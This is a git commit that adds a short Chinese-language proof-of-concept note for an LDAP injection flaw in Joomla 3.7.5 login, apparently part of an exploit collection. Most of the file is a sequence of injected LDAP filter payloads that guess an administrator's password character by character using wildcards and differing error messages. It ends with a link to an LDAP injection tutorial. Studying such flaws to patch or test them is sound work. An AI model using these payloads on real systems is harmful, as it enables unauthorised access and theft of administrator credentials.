8c9cfd3aec89d7836ad8f0fd0d9cd566a2d21294
Mr5m1th <624995173@qq.com>
2017-09-27 02:43:06 +0800

    *

---
+++ CMS/Joomla/Joomla_v3.7.5.php
@@ -0,0 +1,16 @@
+漏洞利用POC
+	LDAP查询中使用的用户名缺乏对输入内容的过滤，允许构造恶意内容进行LDAP查询。通过使用通配符和通过观察不同的身份验证错误消息，攻击者可以逐字地搜索登录凭据，方法是逐个发送一行有意义的字符串去不断猜测。 
+	XXX;(&(uid=Admin)(userPassword=A*))
+	XXX;(&(uid=Admin)(userPassword=B*))
+	XXX;(&(uid=Admin)(userPassword=C*))
+	...
+	XXX;(&(uid=Admin)(userPassword=s*))
+	...
+	XXX;(&(uid=Admin)(userPassword=se*))
+	...
+	XXX;(&(uid=Admin)(userPassword=sec*))
+	...
+	XXX;(&(uid=Admin)(userPassword=secretPassword))
+
+
+	LDAP注入学习理解(http://www.cnblogs.com/bendawang/p/5156562.html)
